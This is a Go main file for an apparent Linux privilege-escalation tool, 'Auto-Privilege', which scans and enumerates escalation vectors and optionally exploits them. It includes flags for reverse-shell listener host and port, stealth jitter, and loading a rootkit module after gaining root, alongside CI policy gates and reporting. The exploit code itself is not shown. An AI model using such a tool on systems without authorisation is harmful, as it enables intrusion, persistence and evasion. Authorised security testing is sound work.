package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"runtime"
	"time"
)

func main() {
	p := run()

	// FASE 1: Scan
	if !p.Opts.Quiet && !p.Opts.JSON {
		fmt.Println(colorize("  [1/3] Scanning system...", AnsiCyan))
	}
	scanAll(p)

	// FASE 2: Enumerate
	if !p.Opts.Quiet && !p.Opts.JSON {
		fmt.Println(colorize("\n  [2/3] Enumerating vectors...", AnsiCyan))
	}
	if p.Opts.Vector != "" {
		names, err := parseVectorList(p.Opts.Vector)
		if err != nil {
			// unreachable: validated in run(), kept as a guard
			fmt.Fprintf(os.Stderr, "  [-] %v\n", err)
			os.Exit(2)
		}
		enumerateVectors(p, names)
	} else {
		enumerateAll(p)
	}

	// Print findings
	if !p.Opts.JSON && !p.Opts.Quiet {
		fmt.Println(colorize("\n  ── Findings ──", AnsiCyan))
		shown := 0
		for _, f := range p.Findings {
			if f.Exploitable {
				p.Print(f)
				shown++
			}
		}
		if shown == 0 {
			fmt.Println(colorize("    (no exploitable findings — system looks clean)", AnsiGrey))
		}
	}

	// Baseline diff: computed once here so the terminal block, the JSON
	// export and the markdown report all share the same numbers.
	if p.Baseline != nil {
		p.Diff = diffReports(p.Baseline, p.Findings)
		p.Diff.BaselinePath = p.Opts.Baseline
		printDiffSummary(p)
	}

	// FASE 3: Exploit (or show the plan)
	// --dry-run shows the execution plan on its own: the usage text and
	// both READMEs promise "scan + enumerate, show what would run", but
	// the old condition required --exploit --dry-run together, so a lone
	// --dry-run silently skipped the plan.
	if p.Opts.DryRun {
		printDryRunPlan(p)
		logDryRun(p.Opts)
	} else if p.Opts.Exploit {
		if isRoot() {
			if !p.Opts.Quiet && !p.Opts.JSON {
				fmt.Println(colorize("\n  [!] Already running as root — nothing to escalate", AnsiYellow))
				fmt.Println(colorize("  [!] Tip: --dry-run shows the execution plan", AnsiGrey))
			}
			if p.Opts.Rooteame != "" {
				tryRooteame(p)
			}
		} else {
			if !p.Opts.Quiet && !p.Opts.JSON {
				fmt.Println(colorize("\n  [3/3] Exploiting... (max risk: "+p.Opts.MaxRisk.String()+")", AnsiCyan))
			}
			exploitAll(p)
		}
	}

	// No root obtained: show the strongest manual options instead of nothing.
	if !p.Rooted && !isRoot() && p.Opts.Exploit && !p.Opts.Quiet && !p.Opts.JSON {
		fmt.Println(colorize("\n  [*] No root obtained. Top vectors:", AnsiYellow))
		printTopVectors(p, 5)
	}

	if p.Opts.Report != "" {
		if err := p.WriteMarkdownReport(p.Opts.Report); err != nil {
			fmt.Fprintf(os.Stderr, "  [-] report write failed: %v\n", err)
		} else if !p.Opts.Quiet && !p.Opts.JSON {
			fmt.Println(colorize("  [+] Markdown report written: "+p.Opts.Report, AnsiGreen))
		}
	}

	if p.Opts.JSON {
		if err := p.ExportJSON(); err != nil {
			fmt.Fprintf(os.Stderr, "  [-] json export failed: %v\n", err)
		}
	}

	if p.Opts.Output != "" {
		if err := p.WriteJSONFile(p.Opts.Output); err != nil {
			fmt.Fprintf(os.Stderr, "  [-] output write failed: %v\n", err)
		} else if !p.Opts.Quiet && !p.Opts.JSON {
			fmt.Println(colorize("  [+] JSON report written: "+p.Opts.Output, AnsiGreen))
		}
	}

	// Elapsed is measured HERE, not right after run(): the old code
	// captured it before the scan even started, so the printed summary
	// always showed ~0s on a scan that really took seconds (the JSON was
	// already correct — it measures at export time).
	printSummary(p, time.Since(p.Started))

	// Exit codes (documented): 0 = root or scan-only run, 1 = exploit ran
	// without root, 2 = usage error, 3 = --fail-on policy gate tripped.
	// The gate is evaluated last and wins: a CI job must fail (3) even
	// when an exploit attempt also failed (1) — all reports above are
	// already written either way.
	exitCode := 0
	if p.Opts.Exploit && !p.Opts.DryRun && !p.Rooted && !isRoot() {
		exitCode = 1
	}
	if n := policyGateCount(p); n > 0 {
		exitCode = 3
		msg := fmt.Sprintf("  [!] policy gate: %d exploitable finding(s) at/above %s — exit 3\n",
			n, p.Opts.FailOnRisk.String())
		if p.Opts.JSON || p.Opts.Quiet {
			fmt.Fprint(os.Stderr, msg)
		} else {
			fmt.Print(msg)
		}
	}
	if exitCode != 0 {
		os.Exit(exitCode)
	}
}

func run() *AutoPrivilege {
	var opts Options
	var risk string
	var showVersion bool
	var baseline *jsonReport

	flag.BoolVar(&opts.Exploit, "exploit", false, "Auto-exploit found vectors")
	flag.StringVar(&risk, "risk", "safe", "Max risk: safe, low, medium, high, danger")
	flag.StringVar(&opts.Vector, "vector", "", "Comma-separated vectors: suid,sgid,sudo,cron,passwd,shadow,docker,container,caps,nfs,path,service,kernel,cred,preload,sudoers")
	flag.BoolVar(&opts.JSON, "json", false, "JSON output")
	flag.BoolVar(&opts.Quiet, "quiet", false, "Quiet mode (exit code only)")
	flag.StringVar(&opts.Rooteame, "rooteame", "", "Path to rootkit.ko to load on root (lab only)")
	flag.BoolVar(&opts.Stealth, "stealth", false, "Add jitter between scanners and exploits")
	flag.BoolVar(&opts.OneShot, "one-shot", false, "Stop after first successful exploit")
	flag.StringVar(&opts.LHost, "lhost", "", "Listener host for reverse shells")
	flag.StringVar(&opts.LPort, "lport", "4444", "Listener port for reverse shells")
	flag.BoolVar(&opts.DryRun, "dry-run", false, "Scan and enumerate only, no exploitation")
	flag.StringVar(&opts.LogFormat, "log", "text", "Log format: text, json")
	flag.BoolVar(&opts.UpdateGTFO, "update-gtfobins", false, "Update and persist the GTFOBins database")
	flag.BoolVar(&opts.NoColor, "no-color", false, "Disable ANSI colors (auto-off when piped)")
	flag.BoolVar(&opts.Verbose, "verbose", false, "Verbose logging on stderr")
	flag.BoolVar(&opts.ListGTFO, "list-gtfo", false, "Print the embedded GTFOBins database and exit")
	flag.StringVar(&opts.Report, "report", "", "Write a markdown report to this path")
	flag.StringVar(&opts.Output, "output", "", "Write the JSON report to this file (0600)")
	flag.StringVar(&opts.Baseline, "baseline", "", "Diff findings against a previous --json/--output report")
	flag.StringVar(&opts.FailOn, "fail-on", "", "Exit 3 if any exploitable finding at/above this risk: low, medium, high, danger")
	flag.DurationVar(&opts.ScanTimeout, "scan-timeout", 5*time.Second, "Timeout for external commands during scan (e.g. 10s, 2m)")
	flag.BoolVar(&showVersion, "version", false, "Print version and exit")

	flag.Usage = usage
	flag.Parse()

	// Fail fast on a bad --vector before wasting a full scan.
	if opts.Vector != "" {
		if _, err := parseVectorList(opts.Vector); err != nil {
			fmt.Fprintf(os.Stderr, "  [-] %v\n", err)
			os.Exit(2)
		}
	}

	// Fail fast on a bad --fail-on / unreadable --baseline too: both are
	// usage errors, and a CI gate must never scan for minutes before
	// discovering its configuration was wrong.
	if opts.FailOn != "" {
		lvl, enabled, err := parseFailOn(opts.FailOn)
		if err != nil {
			fmt.Fprintf(os.Stderr, "  [-] %v\n", err)
			os.Exit(2)
		}
		opts.FailOnRisk = lvl
		opts.FailOnEnabled = enabled
	}
	if opts.Baseline != "" {
		b, err := loadBaseline(opts.Baseline)
		if err != nil {
			fmt.Fprintf(os.Stderr, "  [-] baseline: %v\n", err)
			os.Exit(2)
		}
		baseline = b
	}

	// Colors: auto-disable when piped, when told to, or when NO_COLOR is set.
	setColorMode(isTerminal(os.Stdout) && !opts.NoColor && os.Getenv("NO_COLOR") == "")

	if showVersion {
		fmt.Printf("Auto-Privilege v%s (%s/%s)\n", Version, runtime.GOOS, runtime.GOARCH)
		os.Exit(0)
	}

	if opts.ListGTFO {
		printGTFOList()
		os.Exit(0)
	}

	if !validMaxRisk(risk) {
		fmt.Fprintf(os.Stderr, "  [-] invalid --risk %q (valid: safe, low, medium, high, danger)\n", risk)
		os.Exit(2)
	}
	opts.MaxRisk = parseMaxRisk(risk)

	if opts.ScanTimeout <= 0 {
		fmt.Fprintf(os.Stderr, "  [-] invalid --scan-timeout %q (must be a positive duration, e.g. 10s)\n", opts.ScanTimeout)
		os.Exit(2)
	}

	if opts.Quiet {
		opts.Exploit = true
	}
	if opts.LHost == "" {
		opts.LHost = detectLocalIP()
	}

	p := &AutoPrivilege{Opts: opts, Baseline: baseline, Started: time.Now()}

	printBanner(opts)

	if !opts.Quiet && !opts.JSON {
		fmt.Printf("  %s %-10s  %s %-8d  %s %s\n\n",
			colorize("USER:", AnsiGrey), amIRoot(),
			colorize("PID:", AnsiGrey), os.Getpid(),
			colorize("Host:", AnsiGrey), hostname())
	}

	if opts.UpdateGTFO {
		if err := updateGTFOBins(opts); err != nil {
			fmt.Fprintf(os.Stderr, "  [-] GTFOBins update failed: %v\n", err)
			os.Exit(1)
		}
		if !opts.Exploit && opts.Vector == "" {
			os.Exit(0)
		}
	}

	return p
}

func hostname() string {
	h, _ := os.Hostname()
	if h == "" {
		return "unknown"
	}
	return h
}

func detectLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "127.0.0.1"
}
